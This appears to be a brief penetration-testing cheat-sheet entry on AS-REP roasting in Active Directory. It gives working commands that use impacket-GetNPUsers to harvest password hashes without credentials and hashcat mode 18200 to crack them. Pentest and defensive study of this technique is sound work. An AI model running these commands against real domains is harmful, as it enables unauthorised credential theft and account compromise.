# 17.01 AS-REP Roasting

> Pull AS-REPs for accounts with `UF_DONT_REQUIRE_PREAUTH` without creds and crack them with `hashcat -m 18200`.

## Overview

Users with UF_DONT_REQUIRE_PREAUTH leak an AS-REP encrypted with their key to anyone who asks — no creds needed. Crack -m 18200.

## Steps

- **Find PreauthNotRequired users** — PowerView / impacket.
- **Request AS-REP** — no auth needed.
- **Crack** — hashcat -m 18200.

## Commands

### Unauthenticated harvest

```bash
impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile users.txt -dc-ip <DC-IP> -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```
